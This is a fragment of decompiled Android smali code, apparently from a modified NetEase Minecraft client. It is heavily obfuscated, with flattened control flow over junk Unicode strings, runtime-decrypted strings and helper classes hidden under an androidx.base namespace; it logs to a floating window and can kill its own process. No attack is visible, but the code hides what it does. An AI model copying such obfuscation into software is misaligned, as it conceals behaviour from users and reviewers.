    const-string v3, "\u06e4\u06da\u06e6\u06d8\u06e0\u06eb\u06da\u06e0\u06e4\u06e4\u06df\u06dc\u06e8\u06d8\u06dc\u06ec\u06e8\u06d8\u06d8\u06e5\u06da\u06e5\u06e8\u06e0\u06ec\u06e2\u06df\u06da\u06db\u06e4\u06ec\u06eb\u06e7\u06d7\u06e6\u06d8\u06d7\u06e6\u06e6"

    goto :goto_65

    :sswitch_121
    if-eqz p9, :cond_25

    const-string v3, "\u06d9\u06e0\u06dc\u06d7\u06e1\u06e6\u06d8\u06e5\u06e4\u06e5\u06e8\u06e2\u06d8\u06d8\u06e6\u06d9\u06dc\u06d8\u06d8\u06eb\u06d8\u06d8\u06e6\u06e5\u06da\u06da\u06e2\u06ec\u06e5\u06eb\u06eb\u06df\u06d6\u06db\u06e4\u06e5\u06e0\u06e2\u06e5\u06d8\u06ec\u06e8\u06d8\u06e2\u06db\u06dc\u06d8\u06e2\u06e2\u06e6\u06d8\u06da\u06da\u06e5\u06d8\u06e5\u06e1\u06e8\u06d8\u06e6\u06e4\u06e6\u06d8"

    goto :goto_65

    :sswitch_122
    const-string v3, "\u06d8\u06da\u06e5\u06d7\u06d7\u06d8\u06db\u06e8\u06e8\u06e6\u06dc\u06e8\u06d8\u06e0\u06dc\u06e8\u06d8\u06e6\u06db\u06dc\u06e0\u06da\u06d9\u06d6\u06e8\u06d6\u06d8\u06e4\u06da\u06d6\u06d8\u06d8\u06e8\u06da\u06da\u06d8\u06e2\u06d7\u06dc\u06e0\u06e5\u06d6\u06eb\u06da\u06e1\u06e5\u06d7\u06d6\u06eb\u06db\u06ec\u06db"

    goto/16 :goto_62

    :sswitch_123
    const-string v3, "\u06db\u06e1\u06e0\u06db\u06da\u06e8\u06d8\u06d9\u06e1\u06e5\u06d7\u06df\u06e5\u06db\u06e8\u06d8\u06d8\u06db\u06db\u06d8\u06d8\u06eb\u06d8\u06e7\u06d8\u06db\u06d7\u06d9\u06da\u06e8\u06df\u06eb\u06ec\u06d8\u06d8\u06d7\u06d8\u06e7\u06d8\u06da\u06db\u06e8\u06d7\u06e2\u06e1\u06db\u06e5\u06e2\u06e5\u06e1\u06e0\u06e6\u06e8\u06e7\u06d8"

    goto/16 :goto_62

    :sswitch_124
    const-string v3, "\u06e6\u06e5\u06d8\u06ec\u06e2\u06d9\u06eb\u06e2\u06e8\u06e4\u06e8\u06e6\u06d8\u06e7\u06d9\u06e5\u06d8\u06d6\u06e1\u06d6\u06d8\u06d8\u06d9\u06e1\u06e2\u06e6\u06e4\u06d8\u06d8\u06dc\u06d8\u06da\u06e1\u06db\u06da\u06db\u06e5\u06da\u06d7\u06d6\u06d8\u06e8\u06ec\u06e5\u06e8\u06ec\u06e8\u06e1\u06da\u06df\u06d8\u06e5\u06dc"

    goto/16 :goto_63

    :sswitch_125
    const v5, -0x2d1d01a4

    const-string v3, "\u06e1\u06db\u06eb\u06e6\u06db\u06d7\u06e6\u06e0\u06eb\u06e6\u06dc\u06eb\u06da\u06dc\u06d8\u06df\u06e7\u06d8\u06e7\u06e4\u06e5\u06d6\u06da\u06dc\u06dc\u06ec\u06d7\u06db\u06d9\u06e5\u06d8\u06e1\u06e6\u06df\u06eb\u06e7\u06e8\u06d8\u06e7\u06e0\u06e0\u06e5\u06e1\u06da\u06e5\u06da\u06d8\u06da\u06e6\u06df\u06df\u06e0\u06eb\u06d8\u06e4\u06e4"

    :goto_66
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_4f

    goto :goto_66

    :sswitch_126
    const-string v3, "\u06e5\u06e6\u06d8\u06e4\u06e6\u06e7\u06da\u06db\u06db\u06e1\u06e8\u06e7\u06d8\u06e6\u06ec\u06e8\u06d8\u06e1\u06e0\u06d6\u06ec\u06d8\u06d8\u06e5\u06e4\u06e4\u06ec\u06e5\u06da\u06e4\u06d8\u06d8\u06e0\u06db\u06dc\u06d8\u06d6\u06eb\u06dc\u06d8\u06dc\u06d8\u06da\u06e7\u06db\u06d9\u06e6\u06d7\u06d8\u06d8\u06e1\u06e5\u06e1"

    goto :goto_66

    :cond_26
    const-string v3, "\u06ec\u06dc\u06e7\u06d8\u06e5\u06ec\u06db\u06d9\u06df\u06eb\u06ec\u06df\u06d9\u06d8\u06e0\u06e1\u06d7\u06e0\u06d9\u06e6\u06e7\u06d8\u06e4\u06da\u06d8\u06d8\u06e8\u06d6\u06d8\u06d8\u06db\u06e8\u06e6\u06d8\u06e1\u06eb\u06d7\u06d7\u06df\u06d9\u06da\u06db\u06d6\u06d8\u06e2\u06e0\u06e6\u06d8\u06da\u06e2\u06e5\u06d8\u06eb\u06df\u06e5\u06d8\u06d7\u06ec\u06e4\u06eb\u06eb\u06e1\u06d8"

    goto :goto_66

    :sswitch_127
    const/4 v3, 0x0

    aget-boolean v3, p7, v3

    if-eqz v3, :cond_26

    const-string v3, "\u06d9\u06e4\u06ec\u06e6\u06dc\u06d8\u06d8\u06df\u06e0\u06e8\u06d8\u06d9\u06df\u06d7\u06d7\u06e1\u06eb\u06db\u06d7\u06dc\u06d8\u06e5\u06e0\u06d7\u06dc\u06d6\u06d7\u06e5\u06e6\u06e4\u06e5\u06e1\u06d8\u06da\u06eb\u06e8\u06d7\u06d6\u06d7\u06e4\u06d8\u06eb\u06d8\u06d6\u06d8"

    goto :goto_66

    :sswitch_128
    const-string v3, "\u06ec\u06e0\u06da\u06e2\u06d8\u06dc\u06d8\u06da\u06ec\u06d6\u06da\u06d8\u06df\u06d9\u06d6\u06e5\u06eb\u06e1\u06ec\u06e7\u06da\u06e4\u06e5\u06e0\u06ec\u06d7\u06d8\u06e5\u06e8\u06d8\u06e0\u06e4\u06e5\u06eb\u06dc\u06ec"

    goto/16 :goto_63

    :sswitch_129
    const-string v3, "\u06dc\u06d8\u06df\u06d7\u06d8\u06d8\u06da\u06eb\u06e5\u06e0\u06e7\u06e1\u06d8\u06da\u06e5\u06d8\u06e7\u06d8\u06d8\u06df\u06e4\u06e7\u06d6\u06e5\u06e8\u06d6\u06e1\u06d8\u06d8\u06db\u06e0\u06d8\u06eb\u06db\u06e8\u06d8\u06e0\u06db\u06e6\u06dc\u06e1\u06da\u06e0\u06d8\u06db\u06d6\u06eb\u06e0\u06e0\u06e2\u06dc\u06d8"

    goto/16 :goto_63

    :sswitch_12a
    const-string v3, "\u06e2\u06eb\u06d6\u06d8\u06df\u06e1\u06d8\u06d8\u06e2\u06d6\u06e6\u06eb\u06da\u06ec\u06e7\u06e0\u06e6\u06d8\u06e6\u06da\u06df\u06e8\u06d8\u06d9\u06e8\u06e5\u06db\u06e5\u06eb\u06e8\u06d8\u06d7\u06d7\u06df\u06d8\u06e4\u06e5\u06e5\u06ec\u06da\u06d6\u06e5\u06e0\u06e5\u06e1\u06d7"

    goto :goto_64

    :sswitch_12b
    const v5, 0x4cb4a721    # 9.471412E7f

    const-string v3, "\u06db\u06d9\u06e6\u06d7\u06ec\u06da\u06e0\u06e5\u06d8\u06db\u06e5\u06e8\u06e5\u06e0\u06e7\u06e2\u06e0\u06d6\u06ec\u06e2\u06e6\u06d6\u06d9\u06e5\u06d8\u06df\u06e1\u06e6\u06d8\u06e5\u06e1\u06e7\u06df\u06df\u06e1\u06eb\u06e0\u06db\u06e0\u06e6\u06d7\u06d8\u06e8\u06d8"

    :goto_67
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_50

    goto :goto_67

    :sswitch_12c
    const-string v3, "\u06e4\u06eb\u06e4\u06e0\u06eb\u06d7\u06e1\u06e8\u06ec\u06e6\u06e4\u06e0\u06d7\u06e8\u06e5\u06d8\u06e2\u06e8\u06e5\u06db\u06d9\u06e6\u06d8\u06e4\u06d7\u06e8\u06e8\u06dc\u06d8\u06d8\u06eb\u06ec\u06d6\u06d8\u06e2\u06e6\u06df\u06db\u06e2\u06e2\u06df\u06d6\u06d8\u06d8\u06e5\u06e0\u06d8\u06e6\u06e2\u06dc\u06d8\u06d7"

    goto :goto_67

    :cond_27
    const-string v3, "\u06e7\u06db\u06dc\u06e2\u06e6\u06df\u06d8\u06ec\u06d9\u06e2\u06d8\u06d8\u06d8\u06dc\u06d6\u06db\u06e1\u06e6\u06e7\u06e4\u06e5\u06e8\u06e1\u06e7\u06e5\u06d6\u06e8\u06e8\u06d8\u06db\u06e5\u06d8\u06e6\u06d7\u06d6\u06eb\u06e5\u06d9\u06d7\u06e6\u06eb\u06d8\u06da\u06e1\u06e7\u06db\u06dc\u06db\u06e7\u06dc\u06e6\u06df\u06db\u06e7\u06d7\u06e7"

    goto :goto_67

    :sswitch_12d
    const/4 v3, 0x0

    aget v3, p10, v3

    const/4 v6, 0x2

    if-lt v3, v6, :cond_27

    const-string v3, "\u06db\u06e4\u06dc\u06e2\u06d8\u06eb\u06da\u06e2\u06e1\u06d9\u06d8\u06d8\u06df\u06dc\u06dc\u06d8\u06ec\u06e4\u06da\u06db\u06d9\u06e8\u06e8\u06d8\u06e0\u06e6\u06e5\u06d8\u06ec\u06e1\u06d8\u06d8\u06eb\u06df\u06e5\u06d8\u06e6\u06dc\u06e7\u06dc\u06e8\u06dc\u06d8\u06df\u06e1\u06d9"

    goto :goto_67

    :sswitch_12e
    const-string v3, "\u06e8\u06d7\u06df\u06eb\u06e4\u06dc\u06e6\u06da\u06dc\u06d8\u06e4\u06d6\u06d6\u06db\u06e1\u06db\u06e7\u06e7\u06e7\u06d8\u06d8\u06dc\u06d8\u06df\u06da\u06e4\u06ec\u06dc\u06e6\u06e1\u06dc\u06e0\u06db\u06e5\u06ec\u06d9\u06e0\u06e5\u06d9\u06d6\u06e5\u06e7\u06e4\u06da\u06d9\u06d7\u06e8\u06d8\u06d9\u06d8\u06e5"

    goto :goto_64

    :sswitch_12f
    const-string v3, "\u06eb\u06da\u06dc\u06d8\u06d6\u06da\u06dc\u06eb\u06dc\u06df\u06d9\u06e5\u06d7\u06e6\u06e5\u06e1\u06db\u06dc\u06d6\u06d7\u06e5\u06e8\u06d8\u06db\u06df\u06e6\u06da\u06e4\u06d8\u06d8\u06eb\u06d9\u06e1\u06da\u06e5\u06e4\u06e8\u06e7\u06e1"

    goto/16 :goto_64

    :sswitch_130
    const-string v2, "jRnyKeE7Y7DZRMtMoh0myd4Tv0vJSSKhSZN2JPkCaZDlRe1BojAsxOcWs0PSSQ6cgCTbK/kCaZDl\nRu1fojEZxNY6sWTP\n"

    const-string v3, "aaFWzESshiw=\n"

    invoke-static {v2, v3}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "y6ANey0=\n"

    const-string v4, "rtJ/FF9k2jk=\n"

    invoke-static {v3, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    const v3, -0x4f901390

    const-string v2, "\u06d6\u06d6\u06e5\u06d8\u06eb\u06e1\u06e8\u06e7\u06eb\u06e1\u06eb\u06df\u06eb\u06ec\u06e0\u06e0\u06db\u06e0\u06ec\u06e0\u06d8\u06dc\u06d8\u06e1\u06eb\u06df\u06eb\u06eb\u06d7\u06d7\u06d6\u06e1\u06d8\u06ec\u06e7\u06d8\u06df\u06dc\u06df\u06da\u06e8\u06d6\u06d8\u06d8\u06dc\u06dc\u06dc\u06e7\u06e2\u06d8\u06df"

    :goto_68
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_51

    goto :goto_68

    :sswitch_131
    const-string v2, "\u06e1\u06db\u06da\u06ec\u06e8\u06e7\u06e7\u06e0\u06da\u06e0\u06d6\u06d7\u06eb\u06df\u06df\u06e1\u06d6\u06e8\u06eb\u06d6\u06e7\u06d8\u06d9\u06e1\u06e2\u06e1\u06e5\u06e0\u06ec\u06e5\u06d8\u06db\u06da\u06dc\u06d8\u06d9\u06d6\u06db\u06e1\u06e8\u06e4\u06eb\u06dc\u06db\u06ec\u06e1\u06e5\u06df\u06dc\u06e2"

    goto :goto_68

    :sswitch_132
    const-string v2, "\u06e1\u06e0\u06e7\u06e2\u06e8\u06d9\u06e5\u06e8\u06da\u06e2\u06ec\u06e8\u06d8\u06d7\u06ec\u06dc\u06e8\u06d8\u06e1\u06e8\u06da\u06e5\u06d8\u06ec\u06e1\u06d7\u06e2\u06d9\u06df\u06eb\u06d6\u06e8\u06d8"

    goto :goto_68

    :sswitch_133
    const v4, -0x367b6da

    const-string v2, "\u06e8\u06e2\u06d9\u06da\u06e1\u06dc\u06d8\u06d7\u06e5\u06e6\u06e2\u06d9\u06e5\u06d8\u06df\u06e5\u06d6\u06d8\u06d8\u06e7\u06d9\u06d6\u06df\u06e2\u06d6\u06eb\u06db\u06e5\u06eb\u06da\u06e8\u06db\u06d8\u06d8"

    :goto_69
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_52

    goto :goto_69

    :sswitch_134
    const-string v2, "\u06ec\u06eb\u06e6\u06d9\u06db\u06d8\u06d8\u06e4\u06e5\u06dc\u06e8\u06eb\u06d9\u06eb\u06d6\u06e1\u06df\u06ec\u06d6\u06d9\u06e8\u06dc\u06d8\u06dc\u06e5\u06d9\u06ec\u06e1\u06e1\u06d8\u06e0\u06e7\u06d6\u06d8\u06dc\u06da\u06e6\u06db\u06e0\u06e1"

    goto :goto_69

    :cond_28
    const-string v2, "\u06e5\u06d6\u06e2\u06d9\u06e4\u06e6\u06d8\u06e6\u06dc\u06db\u06d8\u06da\u06ec\u06e1\u06e5\u06d6\u06d8\u06e8\u06d7\u06db\u06d8\u06db\u06e5\u06d8\u06e2\u06eb\u06e8\u06e2\u06e7\u06e2\u06ec\u06ec\u06d7\u06e4\u06eb\u06df\u06e2\u06d9\u06eb\u06d6\u06db\u06e5\u06d8\u06da\u06df\u06dc\u06d8\u06e1\u06d9\u06e8\u06eb\u06e5\u06d9"

    goto :goto_69

    :sswitch_135
    sget-object v2, Lcom/netease/mc/m439a/cfEHNcirhPZZLCL;->NETWORK:Ljava/lang/String;

    const-string v5, "Hds0PqyJSQwN2yc=\n"

    const-string v6, "Rvh6e/jeBl4=\n"

    invoke-static {v5, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Lj$/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_28

    const-string v2, "\u06dc\u06e7\u06e6\u06d8\u06e6\u06ec\u06e6\u06e6\u06d6\u06e6\u06e6\u06e2\u06e6\u06d8\u06eb\u06e1\u06e8\u06e4\u06e8\u06d9\u06da\u06e8\u06e8\u06ec\u06e6\u06d8\u06d7\u06d7\u06e0\u06e0\u06da\u06dc\u06d8\u06db\u06dc\u06d8\u06d8\u06d9\u06e2\u06d6\u06d8\u06e1\u06e5\u06e7\u06d7\u06e6\u06e2\u06e0\u06e0\u06d9\u06da\u06e6\u06e5\u06e4\u06e5\u06e2\u06e7\u06e4\u06ec"

    goto :goto_69

    :sswitch_136
    const-string v2, "\u06d8\u06e5\u06d9\u06e7\u06e4\u06d6\u06d8\u06ec\u06e1\u06ec\u06e5\u06e2\u06e4\u06e6\u06eb\u06d9\u06df\u06e5\u06dc\u06d8\u06d6\u06e0\u06eb\u06e5\u06da\u06dc\u06d8\u06df\u06d7\u06e0\u06e1\u06e1\u06e6\u06e5\u06e7\u06d9\u06ec\u06e6\u06ec\u06e2\u06e6\u06d8\u06d8\u06da\u06db\u06d7"

    goto :goto_68

    :sswitch_137
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {v2}, Landroid/os/Process;->killProcess(I)V

    goto/16 :goto_2b

    :sswitch_138
    const-string v3, "\u06d6\u06e2\u06da\u06e7\u06eb\u06e5\u06d8\u06eb\u06d6\u06e6\u06df\u06e7\u06d8\u06d8\u06e6\u06d9\u06d8\u06df\u06e2\u06dc\u06dc\u06e2\u06d6\u06d8\u06e5\u06df\u06e6\u06d8\u06db\u06d8\u06da\u06e4\u06dc\u06d6\u06e6\u06e7\u06df\u06d6\u06e2\u06ec\u06e0\u06d6\u06e8\u06d6\u06e1\u06d8"

    goto/16 :goto_5e

    :sswitch_139
    const v6, 0x577b0b28

    const-string v3, "\u06e0\u06ec\u06e8\u06dc\u06df\u06e5\u06e0\u06ec\u06d7\u06e2\u06eb\u06e2\u06e2\u06da\u06e6\u06e0\u06d8\u06d8\u06ec\u06e2\u06d8\u06d8\u06e6\u06e5\u06e5\u06d8\u06dc\u06e4\u06d9\u06e5\u06d7\u06d9\u06d6\u06da\u06e7\u06e6\u06e2\u06db"

    :goto_6a
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_53

    goto :goto_6a

    :sswitch_13a
    const-string v3, "\u06e8\u06e8\u06e8\u06d8\u06ec\u06db\u06d9\u06d6\u06d6\u06ec\u06db\u06e1\u06e5\u06d8\u06d7\u06e2\u06eb\u06e7\u06e7\u06dc\u06e8\u06e2\u06e7\u06d6\u06e6\u06d6\u06d8\u06d8\u06e0\u06e8\u06d8\u06d6\u06e2\u06e2\u06e5\u06d8\u06e4\u06e0\u06e4\u06da\u06e4\u06e6\u06df\u06dc\u06e6\u06ec"

    goto/16 :goto_5e

    :cond_29
    const-string v3, "\u06dc\u06df\u06dc\u06d8\u06e7\u06da\u06e8\u06d8\u06d6\u06ec\u06e8\u06da\u06e2\u06eb\u06e2\u06e6\u06dc\u06d8\u06e1\u06dc\u06d7\u06e6\u06da\u06e0\u06e8\u06e5\u06e5\u06d8\u06e8\u06eb\u06df\u06da\u06eb\u06d9"

    goto :goto_6a

    :sswitch_13b
    const/4 v3, 0x0

    aget v3, p0, v3

    if-nez v3, :cond_29

    const-string v3, "\u06e5\u06dc\u06e7\u06e2\u06d9\u06db\u06ec\u06e8\u06dc\u06db\u06e8\u06e8\u06eb\u06e2\u06d8\u06d8\u06e0\u06e0\u06d9\u06e5\u06e2\u06dc\u06e0\u06d7\u06dc\u06d8\u06e4\u06db\u06eb\u06e8\u06eb\u06db\u06da\u06df\u06e1\u06dc\u06d9\u06dc\u06d8\u06e7\u06ec\u06d7\u06e8\u06dc\u06dc"

    goto :goto_6a

    :sswitch_13c
    const-string v3, "\u06d8\u06dc\u06dc\u06e5\u06da\u06e5\u06e1\u06dc\u06e5\u06d8\u06dc\u06eb\u06e6\u06e8\u06da\u06e5\u06d9\u06dc\u06ec\u06dc\u06ec\u06d6\u06df\u06d6\u06e8\u06eb\u06df\u06d6\u06e1\u06eb\u06e6\u06ec\u06d8\u06db\u06da\u06db\u06e2"

    goto :goto_6a

    :sswitch_13d
    const/4 v3, 0x0

    aget v3, p2, v3

    aget-object v3, p1, v3

    :goto_6b
    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "rA8kYg==\n"

    const-string v5, "225WDANcTOk=\n"

    invoke-static {v4, v5}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    :sswitch_13e
    const-wide/16 v4, 0x3e8

    :try_start_2c
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2c
    .catch Ljava/lang/InterruptedException; {:try_start_2c .. :try_end_2c} :catch_9

    :goto_6c
    move-object v3, v2

    goto/16 :goto_0

    :sswitch_13f
    sget-object v3, Landroidx/base/하늘;->a:[Ljava/lang/String;

    const/4 v5, 0x0

    aget v5, p2, v5

    aget-object v3, v3, v5

    goto :goto_6b

    :catch_9
    move-exception v3

    goto :goto_6c

    :catch_a
    move-exception v2

    goto/16 :goto_1f

    :catch_b
    move-exception v2

    goto/16 :goto_1e

    :catch_c
    move-exception v4

    move-object v5, v4

    goto/16 :goto_16

    nop

    :sswitch_data_0
    .sparse-switch
        -0x6106a561 -> :sswitch_5
        -0x1d0928b7 -> :sswitch_d
        0x1f1cc1be -> :sswitch_6
        0x79cad21c -> :sswitch_0
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        -0x774b0f37 -> :sswitch_3
        -0x4588dffa -> :sswitch_4
        -0x44624042 -> :sswitch_2
        0x5a00ff57 -> :sswitch_1
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x283df265 -> :sswitch_f
        -0x19ce05e2 -> :sswitch_13
        0x4155f7e5 -> :sswitch_7
        0x48002a82 -> :sswitch_14
    .end sparse-switch

    :sswitch_data_3
    .sparse-switch
        -0x69c3f784 -> :sswitch_1b
        -0x3899fef0 -> :sswitch_16
        0x1b0d83f4 -> :sswitch_1a
        0x4feffd2e -> :sswitch_8
    .end sparse-switch

    :sswitch_data_4
    .sparse-switch
        -0x4e53688f -> :sswitch_1d
        -0x105a65e9 -> :sswitch_9
        0x365307d3 -> :sswitch_22
        0x61594549 -> :sswitch_21
    .end sparse-switch

    :sswitch_data_5
    .sparse-switch
        -0x61998cbe -> :sswitch_37
        -0x26178419 -> :sswitch_32
        -0x1c874220 -> :sswitch_36
        0x51c27439 -> :sswitch_b
    .end sparse-switch

    :sswitch_data_6
    .sparse-switch
        -0x3540201b -> :sswitch_c
        -0x286a37b4 -> :sswitch_4f
        -0xd34a086 -> :sswitch_4b
        0x4fba4839 -> :sswitch_fd
    .end sparse-switch

    :sswitch_data_7
    .sparse-switch
        -0xd16a73a -> :sswitch_10
        0x19e56684 -> :sswitch_e
        0x411d2e6f -> :sswitch_12
        0x5f903ca3 -> :sswitch_11
    .end sparse-switch

    :sswitch_data_8
    .sparse-switch
        -0x747b91fe -> :sswitch_17
        -0x31eb83e2 -> :sswitch_18
        0x4cab15a0 -> :sswitch_15
        0x561b6b07 -> :sswitch_19
    .end sparse-switch

    :sswitch_data_9
    .sparse-switch
        -0x324edc98 -> :sswitch_1e
        0x4d80193b -> :sswitch_1f
        0x63bf1307 -> :sswitch_20
        0x7d465c50 -> :sswitch_1c
    .end sparse-switch

    :sswitch_data_a
    .sparse-switch
        -0x46ebc72b -> :sswitch_26
        -0xc24caf1 -> :sswitch_a
        0x22781c8d -> :sswitch_2a
        0x3b6b4150 -> :sswitch_23
    .end sparse-switch

    :sswitch_data_b
    .sparse-switch
        -0x5e974085 -> :sswitch_a
        0x1963d63a -> :sswitch_2c
        0x5a6c2df5 -> :sswitch_24
        0x6dfe0363 -> :sswitch_30
    .end sparse-switch

    :sswitch_data_c
    .sparse-switch
        -0x69cf551c -> :sswitch_28
        -0x500b0b7 -> :sswitch_25
        0x24ea05a1 -> :sswitch_27
        0x6c933196 -> :sswitch_29
    .end sparse-switch

    :sswitch_data_d
    .sparse-switch
        -0x384e2c94 -> :sswitch_2e
        0x38209c8 -> :sswitch_2d
        0x1e2968ae -> :sswitch_2f
        0x7685080c -> :sswitch_2b
    .end sparse-switch

    :sswitch_data_e
    .sparse-switch
        -0x7e7d73f9 -> :sswitch_31
        -0x2cacd3fd -> :sswitch_33
        0xc3e87fd -> :sswitch_35
        0x6855437d -> :sswitch_34
    .end sparse-switch

    :sswitch_data_f
    .sparse-switch
        -0x4908d1e8 -> :sswitch_3e
        -0x32a78402 -> :sswitch_38
        -0x3081073 -> :sswitch_3f
        0x557e9469 -> :sswitch_3a
    .end sparse-switch

    :sswitch_data_10
    .sparse-switch
        0x63bb2970 -> :sswitch_3c
        0x63d6ab16 -> :sswitch_3d
        0x6884da82 -> :sswitch_3b
        0x7a7d7b70 -> :sswitch_39
    .end sparse-switch

    :sswitch_data_11
    .sparse-switch
        -0xd88353a -> :sswitch_49
        0x4a2d6464 -> :sswitch_40
        0x4fa42276 -> :sswitch_46
        0x6e913c8c -> :sswitch_42
    .end sparse-switch

    :sswitch_data_12
    .sparse-switch
        -0x7e787cb1 -> :sswitch_43
        -0x6e81cd41 -> :sswitch_45
        -0x40e04d9c -> :sswitch_41
        -0x30e7a544 -> :sswitch_44
    .end sparse-switch

    :sswitch_data_13
    .sparse-switch
        -0x258d0e91 -> :sswitch_13e
        0x29114f9b -> :sswitch_47
        0x47bdad42 -> :sswitch_102
        0x58929545 -> :sswitch_101
    .end sparse-switch

    :sswitch_data_14
    .sparse-switch
        -0x76017ed0 -> :sswitch_100
        -0x2ef988c3 -> :sswitch_48
        -0x1a81e86e -> :sswitch_fe
        0x22df957f -> :sswitch_ff
    .end sparse-switch

    :sswitch_data_15
    .sparse-switch
        -0x7acda05f -> :sswitch_4c
        0xf746a3b -> :sswitch_4e
        0x3659c10c -> :sswitch_4a
        0x620c74ef -> :sswitch_4d
    .end sparse-switch

    :sswitch_data_16
    .sparse-switch
        -0x5971f0cc -> :sswitch_55
        0xe84678 -> :sswitch_50
        0x39331d08 -> :sswitch_59
        0x74fb7ea0 -> :sswitch_5a
    .end sparse-switch

    :sswitch_data_17
    .sparse-switch
        -0x735450c6 -> :sswitch_5c
        -0x2ccc82fd -> :sswitch_61
        0x58b793a8 -> :sswitch_51
        0x7eb58ae0 -> :sswitch_60
    .end sparse-switch

    :sswitch_data_18
    .sparse-switch
        -0x3d1466f2 -> :sswitch_64
        0x24023eb5 -> :sswitch_68
        0x41de4e08 -> :sswitch_69
        0x43d1f661 -> :sswitch_52
    .end sparse-switch

    :sswitch_data_19
    .sparse-switch
        -0x3d10c10d -> :sswitch_53
        -0x12ad13de -> :sswitch_c7
        0x1e67380e -> :sswitch_de
        0x1e789747 -> :sswitch_c3
    .end sparse-switch

    :sswitch_data_1a
    .sparse-switch
        -0x281e991a -> :sswitch_57
        -0xb3e386a -> :sswitch_56
        0x22449729 -> :sswitch_58
        0x34a7d779 -> :sswitch_54
    .end sparse-switch

    :sswitch_data_1b
    .sparse-switch
        -0x7712cacd -> :sswitch_5d
        -0x5d25d98a -> :sswitch_5f
        0x3b4c02c -> :sswitch_5e
        0x758a900f -> :sswitch_5b
    .end sparse-switch

    :sswitch_data_1c
    .sparse-switch
        -0x2a4f1e95 -> :sswitch_67
        -0x8d86d1c -> :sswitch_66
        0x1c65b85 -> :sswitch_65
        0x29717ed1 -> :sswitch_63
    .end sparse-switch

    :sswitch_data_1d
    .sparse-switch
        -0x7e16fec7 -> :sswitch_52
        0x1aae6d11 -> :sswitch_6a
        0x5b3466a3 -> :sswitch_70
        0x6a4ecd57 -> :sswitch_6c
    .end sparse-switch

    :sswitch_data_1e
    .sparse-switch
        -0x78d9053d -> :sswitch_6b
        -0x440a05a0 -> :sswitch_6d
        0x21bd52f3 -> :sswitch_6f
        0x59e03971 -> :sswitch_6e
    .end sparse-switch

    :sswitch_data_1f
    .sparse-switch
        -0x68183cd0 -> :sswitch_75
        -0x66447c9d -> :sswitch_71
        -0x47023d91 -> :sswitch_79
        -0x7b109c9 -> :sswitch_52
    .end sparse-switch

    :sswitch_data_20
    .sparse-switch
        -0x7dfb7a81 -> :sswitch_7e
        -0x62c81b75 -> :sswitch_7d
        0x936db65 -> :sswitch_72
        0x216ee131 -> :sswitch_52
    .end sparse-switch

    :sswitch_data_21
    .sparse-switch
        -0x7e39554d -> :sswitch_7a
        -0xa3eeee8 -> :sswitch_73
        0x31f77dbf -> :sswitch_7c
        0x7547ccf5 -> :sswitch_7b
    .end sparse-switch

    :sswitch_data_22
    .sparse-switch
        -0x7e7d6d72 -> :sswitch_77
        -0x38395580 -> :sswitch_78
        0x32785eb -> :sswitch_74
        0x356e41e -> :sswitch_76
    .end sparse-switch

    :sswitch_data_23
    .sparse-switch
        -0x397f6d85 -> :sswitch_84
        -0x149b7fb3 -> :sswitch_85
        0x64736fd7 -> :sswitch_c1
        0x6c071213 -> :sswitch_7f
    .end sparse-switch

    :sswitch_data_24
    .sparse-switch
        -0x6ae414aa -> :sswitch_83
        -0x4c20ba70 -> :sswitch_80
        -0xe4f4f1 -> :sswitch_82
        0x4e990d2c -> :sswitch_81
    .end sparse-switch

    :sswitch_data_25
    .sparse-switch
        -0x5117049b -> :sswitch_8d
        -0x12d8d4ed -> :sswitch_86
        0xe1d8ad8 -> :sswitch_88
        0x14d7783c -> :sswitch_8c
    .end sparse-switch

    :sswitch_data_26
    .sparse-switch
        -0x32bb5c2e -> :sswitch_87
        -0x2790b7ce -> :sswitch_8a
        -0x154f0181 -> :sswitch_8b
        0x55334fac -> :sswitch_89
    .end sparse-switch

    :sswitch_data_27
    .sparse-switch
        -0x6b3b7876 -> :sswitch_91
        -0x4470eb50 -> :sswitch_95
        -0x23bf1428 -> :sswitch_a1
        0x6aa19e36 -> :sswitch_8d
    .end sparse-switch

    :sswitch_data_28
    .sparse-switch
        -0x77384554 -> :sswitch_c1
        -0xe4a58fc -> :sswitch_8e
        0xcc6e459 -> :sswitch_9a
        0x1407302a -> :sswitch_99
    .end sparse-switch

    :sswitch_data_29
    .sparse-switch
        -0x79c8a221 -> :sswitch_96
        -0x44412de0 -> :sswitch_97
        -0x2cfe82c7 -> :sswitch_98
        0x2fb16402 -> :sswitch_8f
    .end sparse-switch

    :sswitch_data_2a
    .sparse-switch
        -0x3022f496 -> :sswitch_94
        -0x2ae21f8c -> :sswitch_92
        0x4543f90f -> :sswitch_90
        0x77acec06 -> :sswitch_93
